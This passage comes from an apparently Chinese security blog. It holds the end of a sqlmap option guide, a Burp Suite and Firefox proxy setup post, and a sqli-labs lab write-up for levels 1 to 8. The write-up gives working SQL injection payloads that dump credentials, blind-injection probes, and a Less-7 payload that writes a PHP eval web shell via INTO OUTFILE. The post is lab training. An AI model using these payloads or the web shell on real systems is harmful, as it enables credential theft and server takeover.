title="–search,-C,-T,-D"></a>–search,-C,-T,-D</h2><p>–search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。</p><p>可以在一下三种情况下使用：</p><p>-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。<br>-T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名<br>-D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。</p><h2 id="–udf-inject-–shared-lib"><a href="#–udf-inject-–shared-lib" class="headerlink" title="–udf-inject,–shared-lib"></a>–udf-inject,–shared-lib</h2><p>你可以通过编译MySQL注入你自定义的函数（UDFs）或PostgreSQL在windows中共享库，DLL，或者Linux&#x2F;Unix中共享对象，sqlmap将会问你一些问题，上传到服务器数据库自定义函数，然后</p><p>根据你的选择执行他们，当你注入完成后，sqlmap将会移除它们。</p><h2 id="s-t"><a href="#s-t" class="headerlink" title="-s,-t"></a>-s,-t</h2><p>参数：-s</p><p>sqlmap对每一个目标都会在output路径下自动生成一个SQLite文件，如果用户想指定读取的文件路径，就可以用这个参数。<br>保存HTTP(S)日志</p><p>参数：-t</p><p>这个参数需要跟一个文本文件，sqlmap会把HTTP(S)请求与响应的日志保存到那里。</p><h2 id="–batch"><a href="#–batch" class="headerlink" title="–batch"></a>–batch</h2><p>–batch</p><p>用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。</p><p>强制使用字符编码<br>–charset</p><p>不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定字符编码如：</p><p>–charset&#x3D;GBK</p><h2 id="–flush-session"><a href="#–flush-session" class="headerlink" title="–flush-session"></a>–flush-session</h2><p>–flush-session</p><p>如果不想用之前缓存这个目标的session文件，可以使用这个参数。 会清空之前的session，重新测试该目标。<br>自动获取form表单测试<br>–hex<br>有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免：<br>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1&quot; --banner --hex -v 3 --parse-errors</span><br></pre></td></tr></table></figure><h2 id="–output-dir"><a href="#–output-dir" class="headerlink" title="–output-dir"></a>–output-dir</h2><p>–output-dir</p><p>sqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径 例如：–output-dir&#x3D;&#x2F;tmp<br>从响应中获取DBMS的错误信息</p><p>参数：–parse-errors</p><p>有时目标没有关闭DBMS的报错，当数据库语句错误时，会输出错误语句，用词参数可以会显出错误信息。</p><h2 id="–smart-–mobile"><a href="#–smart-–mobile" class="headerlink" title="–smart,–mobile"></a>–smart,–mobile</h2><p>–smart<br>有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。<br>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1&quot; --batch --smart</span><br></pre></td></tr></table></figure><p>–mobile<br>有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。<br>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://www.xxxxxx.com/vuln.php?id=1&quot; --mobile</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="–identify-waf-–check-waf"><a href="#–identify-waf-–check-waf" class="headerlink" title="–identify-waf,–check-waf"></a>–identify-waf,–check-waf</h2><p>–identify-waf<br>sqlmap可以尝试找出WAF&#x2F;IPS&#x2F;IDS保护，方便用户做出绕过方式。目前大约支持30种产品的识别。</p><p>–check-waf<br>WAF&#x2F;IPS&#x2F;IDS保护可能会对sqlmap造成很大的困扰，如果怀疑目标有此防护的话，可以使用此参数来测试。 sqlmap将会使用一个不存在的参数来注入测试<br>例如对一个受到ModSecurity WAF保护的MySQL例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot; --identify-waf -v 3</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h2><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前web应用支持堆查询。 当然，当前连接数据库的用户也需要有权限操作注册表。<br>读取注册表值<br>参数：–reg-read<br>写入注册表值<br>参数：–reg-add<br>删除注册表值<br>参数：–reg-del<br>注册表辅助选项<br>参数：–reg-key，–reg-value，–reg-data，–reg-type<br>需要配合之前三个参数使用，例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add --reg-key=&quot;HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap&quot; --reg-value=Test --reg-</span><br><span class="line">type=REG_SZ --reg-data=1</span><br></pre></td></tr></table></figure><h2 id="暴力破解表名"><a href="#暴力破解表名" class="headerlink" title="暴力破解表名"></a>暴力破解表名</h2><p>参数：–common-tables<br>当使用–tables无法获取到数据库的表时，可以使用此参数。<br>通常是如下情况：<br>1、MySQL数据库版本小于5.0，没有information_schema表。<br>2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。<br>3、当前用户没有权限读取系统中保存数据结构的表的权限。<br>暴力破解的表在txt&#x2F;common-tables.txt文件中，你可以自己添加。</p><p>Xx  –common-tables -D testdb</p><h2 id="暴力破解列名"><a href="#暴力破解列名" class="headerlink" title="暴力破解列名"></a>暴力破解列名</h2><p>参数：–common-columns<br>与暴力破解表名一样，暴力跑的列名在txt&#x2F;common-columns.txt中。</p><p>Xx  –common-columns  -T text -D testdb</p><h2 id="POST登录框注入"><a href="#POST登录框注入" class="headerlink" title="POST登录框注入"></a>POST登录框注入</h2><p>注入点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://testasp.vulnweb.com/Login.asp</span><br></pre></td></tr></table></figure><p>几种注入方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sqlmap.py -r search-test.txt -p tfUPass </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://testasp.vulnweb.com/Login.asp --forms</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://testasp.vulnweb.com/Login.asp --data &quot;tfUName=1&amp;tfUPass=1&quot;</span><br></pre></td></tr></table></figure><h2 id="搜索框注入"><a href="#搜索框注入" class="headerlink" title="搜索框注入"></a>搜索框注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r search-test.txt</span><br></pre></td></tr></table></figure><h2 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h2><p>注入点：<a href="http://xxx.com/index.php/Index/view/id/40.html">http://xxx.com/index.php/Index/view/id/40.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://xxx.com/index.php/Index/view/id/40*.htm</span><br></pre></td></tr></table></figure><h2 id="base64编码注入"><a href="#base64编码注入" class="headerlink" title="base64编码注入"></a>base64编码注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://xxx.com --tamper base64encode.py –dbs</span><br></pre></td></tr></table></figure><h2 id="请求时间延迟"><a href="#请求时间延迟" class="headerlink" title="请求时间延迟"></a>请求时间延迟</h2><p>参数：–time-sec<br>当使用继续时间的盲注时，时刻使用–time-sec参数设定延时时间，默认是5秒</p><h2 id="执行sql语句"><a href="#执行sql语句" class="headerlink" title="执行sql语句"></a>执行sql语句</h2><p>–sql-query&#x3D;”select @@version”<br>–sql-shell</p><p>sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。<br>如果是SELECT查询语句，sqlap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。</p><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p>从数据库服务器中读取文件<br>参数：–file-read<br>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://192.168.2.3:81/about/show.php?lang=cn&amp;id=22&quot; --file-read=&quot;C:\Inetpub\wwwroot\mysql-php\1.php&quot;</span><br></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>参数：–file-write,–file-dest<br>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://192.168.2.129/article.php?id=5&quot; --file-write=&quot;C:\1.php&quot; --file-dest=&quot;/var/www/html/x.php&quot;</span><br></pre></td></tr></table></figure><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>参数：–os-cmd,–os-shell<br>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。<br>在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()。<br>cmd执行cmd命令（win）<br>shell执行当前用户命令<br>–os-shell<br>自动上传 脚本文件<br>返回shell</p><h2 id="WAF绕过注入"><a href="#WAF绕过注入" class="headerlink" title="WAF绕过注入"></a>WAF绕过注入</h2><p>注入点:<code>http://192.168.159.1/news.php?id=1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.159.1/news.php?id=1 -v 3 --dbs  --batch --tamper &quot;space2morehash.py&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">space2hash.py   base64encode.py charencode.py</span><br></pre></td></tr></table></figure><h2 id="并不是都要记住-更多是方便做自己来查找"><a href="#并不是都要记住-更多是方便做自己来查找" class="headerlink" title="并不是都要记住,更多是方便做自己来查找"></a>并不是都要记住,更多是方便做自己来查找</h2><h1 id="sqlmap尝试sqli-labs-less-1"><a href="#sqlmap尝试sqli-labs-less-1" class="headerlink" title="sqlmap尝试sqli-labs less-1"></a>sqlmap尝试sqli-labs less-1</h1><ul><li><p>个人靶场地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.130:86/</span><br></pre></td></tr></table></figure></li><li><p>sqli-labs 的  数据库是<code>security</code></p></li><li><p>sqlmap用的是kali里的</p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2></li><li><p>扫描数据库 （注意链接加?id&#x3D;1）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.169.130:86/Less-1/?id=1 --dbs</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>查看数据表 (选择security数据库 查表)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.169.130:86/Less-1/?id=1 -D security --tables</span><br></pre></td></tr></table></figure></li><li><p>查看列字段 （选择security数据库 选择users表 查字段）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.169.130:86/Less-1/?id=1 -D security -T users --clounms</span><br></pre></td></tr></table></figure></li><li><p>查看列字段的具体值  （选择security数据库 选择user表 选择id.username.password并输出（dump））</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.169.130:86/Less-1/?id=1 -D security -T users --columns id.username.password -dump</span><br></pre></td></tr></table></figure></li><li><p>结束</p></li></ul><h1 id="一些扩展"><a href="#一些扩展" class="headerlink" title="一些扩展"></a>一些扩展</h1><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><img src="/img/sqlmap-d52c7840.jpg"><ul><li>图转见水印</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuite+火狐</title>
      <link href="/archives/46a16768.html"/>
      <url>/archives/46a16768.html</url>
      
        <content type="html"><![CDATA[<h1 id="BurpSuite-安装"><a href="#BurpSuite-安装" class="headerlink" title="BurpSuite 安装"></a>BurpSuite 安装</h1><ul><li>往期文章<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://putdown.top/2022/07/22/BurpSuite-%E5%AE%89%E8%A3%85%E6%BF%80%E6%B4%BB/</span><br></pre></td></tr></table></figure></li></ul><h1 id="火狐配置"><a href="#火狐配置" class="headerlink" title="火狐配置"></a>火狐配置</h1><ol><li>首先在burp suite中找到<code>proxy</code>模块，点击<code>options</code>，勾选127.0.0.1:8080</li><li>然后在火狐高级选项里设置代理服务器，在输入网址,点击网页右上角下载CA证书<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://burp</span><br></pre></td></tr></table></figure></li><li>导入CA证书<ol><li>点击浏览器右上角,进入设置.</li><li>左侧菜单选择<code>隐私与安全</code>,右侧出现查看证书.</li><li>点击<code>查看证书</code>,<code>导入</code>选择刚才下载好证书.</li></ol></li><li>在火狐中添加插件proxy switchyomega并配置代理服务器.(也可选择同类型插件)<ol><li>代理服务器&#x2F;IP 填写 <code>127.0.0.1</code></li><li>代理端口&#x2F;端口 填写 &#96;&#96;&#96;8080&#96;&#96;</li></ol></li><li>到这火狐的配置就基本结束</li></ol><h1 id="Burp-Proxy-基本使用"><a href="#Burp-Proxy-基本使用" class="headerlink" title="Burp Proxy 基本使用"></a>Burp Proxy 基本使用</h1><ol><li>选择<code>Proxy</code>&gt;<code>Intercept</code>选项卡，确认“Intercept is on”,打开拦截功能</li><li>打开浏览器，输入URL，并回车，</li><li>选择<code>Proxy</code>&gt;<code>HTTP history</code>可以看到请求返回的所有数据<h2 id="Proxy-下的几个按钮"><a href="#Proxy-下的几个按钮" class="headerlink" title="Proxy 下的几个按钮"></a>Proxy 下的几个按钮</h2></li></ol><ul><li>forward - 数据放行</li><li>drop - 数据丢弃</li><li>off - 拦截关闭</li><li>action - 操作</li><li>chromium - 打开自带的浏览器</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs靶场1-10</title>
      <link href="/archives/9e3b89d1.html"/>
      <url>/archives/9e3b89d1.html</url>
      
        <content type="html"><![CDATA[<p>参考crow: <a href="https://github.com/crow821/crowsec">https://github.com/crow821/crowsec</a></p><p>MySQL连接的当前用户名和主机名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SYSTEM_USER();</span><br></pre></td></tr></table></figure><p>MySQL连接的当前用户名和主机名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT USER(); </span><br></pre></td></tr></table></figure><p>MySQL帐户的用户名和主机名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">current_user()</span><br></pre></td></tr></table></figure><p>MySQL查看当前数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select database();</span><br></pre></td></tr></table></figure><p>MySQL查看当前数据版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select version();</span><br></pre></td></tr></table></figure><p>MySQL查看安装路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@@datadir</span><br></pre></td></tr></table></figure><p>当前操作系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@@version_compile_os</span><br></pre></td></tr></table></figure><p>属于同一组，将属于同一组的列显示出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat()</span><br></pre></td></tr></table></figure><p>A~B</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat_ws(&#x27;~&#x27;,A,B)</span><br></pre></td></tr></table></figure><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><p>查库： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select schema_name from information_schema.schemata;</span><br></pre></td></tr></table></figure><p>查表： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;security&#x27;;</span><br></pre></td></tr></table></figure><p>查列： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=&#x27;users&#x27;;</span><br></pre></td></tr></table></figure><p>查字段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from security.users;</span><br></pre></td></tr></table></figure><h1 id="Less-1-Less-4"><a href="#Less-1-Less-4" class="headerlink" title="Less-1 - Less-4"></a>Less-1 - Less-4</h1><h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><ol><li><p>查看是否有注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.130:86/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Less-1 - Less-4 的不同点</span><br><span class="line">1. ?id=1&#x27;</span><br><span class="line">2. ?id=1 </span><br><span class="line">3. ?id=1&#x27;) </span><br><span class="line">4. ?id=1&quot;</span><br></pre></td></tr></table></figure></li><li><p>查看有多少列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.130:86/Less-1/?id=1&#x27; order by 3--+</span><br></pre></td></tr></table></figure></li><li><p>查看哪些数据可以回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.130:86/Less-1/?id=-1&#x27; UNION SELECT 1,2,3--+</span><br></pre></td></tr></table></figure></li><li><p>查看当前数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.130:86/Less-1/?id=-1&#x27; UNION SELECT 1,2,database()--+</span><br></pre></td></tr></table></figure></li><li><p>查看数据库security</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.130:86/sqli/Less-1/?id=-1&#x27; union select 1,2,schema_name from information_schema.schemata limit 4,1--+  </span><br><span class="line">或 查看所有的数据库</span><br><span class="line">http://192.168.169.130:86/sqli/Less-1/?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata--+ </span><br></pre></td></tr></table></figure></li><li><p>查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.130:86/sqli/Less-1/?id=-1&#x27; union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1--+ </span><br><span class="line">或 查看所有的:</span><br><span class="line">http://192.168.169.130:86/sqli/Less-1/?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+ </span><br></pre></td></tr></table></figure></li><li><p>查询列信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.130:86/sqli/Less-1/?id=-1&#x27; union select 1,2,column_name from information_schema.columns where table_name=0x7573657273--+</span><br><span class="line">或 是查看所以的列信息</span><br><span class="line">http://192.168.169.130:86/sqli/Less-1/?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+ </span><br></pre></td></tr></table></figure></li><li><p>查询一个账号和密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.130:86/sqli/Less-1/?id=-1&#x27; union select 1,2,concat_ws(&#x27;~&#x27;,username,password) from security.users limit 1,1--+</span><br><span class="line">或 直接可以得到所有的账号和密码，并且使用~符号进行分割。</span><br><span class="line">http://192.168.169.130:86/sqli/Less-1/?id=-1&#x27; union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+</span><br></pre></td></tr></table></figure><h1 id="Less-5-bool盲注"><a href="#Less-5-bool盲注" class="headerlink" title="Less-5 bool盲注"></a>Less-5 bool盲注</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2></li><li><p>left()函数：  left(database(),1)&#x3D;’s’</p><blockquote><p>left(a,b)从左侧截取a的前b位，正确则返回1，错误则返回0</p></blockquote></li><li><p>regexp函数：select user() regexp ‘r’</p><blockquote><p>user()的结果是root，regexp为匹配root的正则表达式</p></blockquote></li><li><p>like函数： select user() like ‘ro%  </p><blockquote><p>匹配与regexp相似。</p></blockquote></li><li><p>substr(a,b,c)   elect substr() XXXX       </p><blockquote><p>substr(a,b,c)从位置b开始，截取a字符串c位长度</p></blockquote></li><li><p>ascii()                       </p><blockquote><p>将某个字符串转化为ascii值  </p></blockquote></li><li><p>chr(数字) 或者是ord(‘字母’)          </p><blockquote><p>使用python中的两个函数可以判断当前的ascii值是多少</p></blockquote></li></ol><ul><li>没有错误提示 也没有回显 但是输入错误的话页面会有反应 也就是说 只有 true 和false</li></ul><ol><li><p>查看是否有注入   </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; </span><br></pre></td></tr></table></figure></li><li><p>查看有多少列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; order by 3--+ </span><br></pre></td></tr></table></figure></li><li><p>判断第一位是否是s，然后使用bp进行爆破处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and left((select database()),1)=&#x27;s&#x27;--+ </span><br></pre></td></tr></table></figure><p>通过返回的长度来确定第二位是多少，最后确定为e，依次类推进行测试。</p></li><li><p>或者是使用if来进行判断测试：<br>此时是没有返回的（这种方法是错误的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and  ascii(substr((select database()),1,1))&gt;156--+</span><br></pre></td></tr></table></figure><p>此时返回 you are in…….代表执行成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and  ascii(substr((select database()),1,1))&gt;110--+  </span><br></pre></td></tr></table></figure><h1 id="Less-6-bool盲注-流程同-Less-5"><a href="#Less-6-bool盲注-流程同-Less-5" class="headerlink" title="Less-6 bool盲注(流程同 Less-5)"></a>Less-6 bool盲注(流程同 Less-5)</h1><h2 id="完整注入流程："><a href="#完整注入流程：" class="headerlink" title="完整注入流程："></a>完整注入流程：</h2></li><li><p>通过二分法猜解得到所有的库,红色为可变参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and  ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) &gt;100--+ </span><br></pre></td></tr></table></figure></li><li><p>再次通过二分法可猜解得到security下的所有表。其中，红色为可变参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1))&gt;1--+ </span><br></pre></td></tr></table></figure></li><li><p>通过二分法可猜解users内的字段，其中红色为可变参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 1,1),1,1)) &gt;1 --+  </span><br></pre></td></tr></table></figure></li><li><p>继续猜解即可得到字段内的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27;  and ascii(substr((select username from security.users limit 1,1),1,1))&gt;1--+</span><br></pre></td></tr></table></figure><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><h2 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h2></li></ol><ul><li>一句话木马：php版本：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;  </span><br></pre></td></tr></table></figure></li><li>load_file()  读取本地文件<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;C:\\inetpub\\target\\sqlilabs\\test.txt&#x27;);</span><br></pre></td></tr></table></figure></li><li>into outfile 写文件 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;testtest&#x27; into outfile &#x27;test.txt&#x27;;</span><br></pre></td></tr></table></figure>文件位置： C:\inetpub\target\sqlilabs<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;testtest&#x27; into outfile &#x27;C:\\inetpub\\target\\sqlilabs\\test.txt&#x27;;</span><br></pre></td></tr></table></figure></li><li>注意事项： <code>\\</code></li></ul><h2 id="完整注入流程：-1"><a href="#完整注入流程：-1" class="headerlink" title="完整注入流程："></a>完整注入流程：</h2><ol><li>报错<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-7/?id=1&#x27;))--+</span><br></pre></td></tr></table></figure></li><li>查看有多少列<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-7/?id=1&#x27;)) order by 3--+ </span><br></pre></td></tr></table></figure></li><li>将一句话木马写入其中<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-7/?id=-1&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;&#x27; into outfile &#x27;C:\\phpstudy\\PHPTutorial\\WWW\\sqli\\Less-7\\test.php&#x27; --+ </span><br></pre></td></tr></table></figure></li><li>使用中国菜刀访问即可！</li></ol><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><h2 id="Less-8-bool盲注"><a href="#Less-8-bool盲注" class="headerlink" title="Less-8  bool盲注"></a>Less-8  